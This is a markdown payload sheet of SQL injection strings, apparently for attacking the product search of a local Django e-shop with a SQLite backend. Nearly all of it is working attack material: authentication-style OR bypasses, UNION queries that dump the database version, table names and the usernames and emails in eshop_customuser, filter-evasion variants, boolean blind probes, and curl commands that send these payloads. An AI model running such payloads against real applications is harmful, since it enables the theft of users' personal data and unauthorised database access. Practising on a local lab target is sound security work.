# SQL Injection Test Payloads for SQLite

## Working Payloads

### 1. Basic Boolean-Based (WORKS)
```
' OR '1'='1
```
Returns all products

### 2. Union-Based for SQLite (6 columns)
```
' UNION SELECT '11111111-1111-1111-1111-111111111111', 'Injected Product', 'This is an injected description', 99.99, '2024-01-01', '2024-01-01' --
```
This injects a fake product into the results

### 3. Extract SQLite Version
```
' UNION SELECT '11111111-1111-1111-1111-111111111111', sqlite_version(), 'Version Info', 0, '2024-01-01', '2024-01-01' --
```

### 4. Extract Table Names from SQLite
```
' UNION SELECT '11111111-1111-1111-1111-111111111111', name, 'Table from sqlite_master', 0, '2024-01-01', '2024-01-01' FROM sqlite_master WHERE type='table' --
```

### 5. Extract User Data (CustomUser table in Django)
```
' UNION SELECT id, username, email, 0, date_joined, last_login FROM eshop_customuser --
```

### 6. Comments to bypass filters
```
' OR/**/'1'='1
' OR/*comment*/'1'='1
```

### 7. Case variations
```
' oR '1'='1
' Or '1'='1
```

### 8. Alternative syntax
```
' OR 1=1--
' OR 1=1#
' OR 1=1/*
```

### 9. String concatenation bypass
```
' O'||'R '1'='1
```

### 10. Blind SQL Injection (Time-based won't work well in SQLite)
Instead use boolean-based:
```
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1 --
```

## URL Encoded Versions
Remember to URL encode when testing via browser:
- Space = %20 or +
- ' = %27
- -- = %2D%2D

Example:
```
http://127.0.0.1:8000/?q=%27%20OR%20%271%27%3D%271
```

## Testing with curl
```bash
# Basic test
curl "http://127.0.0.1:8000/?q='%20OR%20'1'='1"

# Union test
curl "http://127.0.0.1:8000/?q='%20UNION%20SELECT%20'11111111-1111-1111-1111-111111111111',%20'Injected%20Product',%20'Description',%2099.99,%20'2024-01-01',%20'2024-01-01'%20--"

# Extract tables
curl "http://127.0.0.1:8000/?q='%20UNION%20SELECT%20'11111111-1111-1111-1111-111111111111',%20name,%20'Table',%200,%20'2024-01-01',%20'2024-01-01'%20FROM%20sqlite_master%20WHERE%20type='table'%20--"
```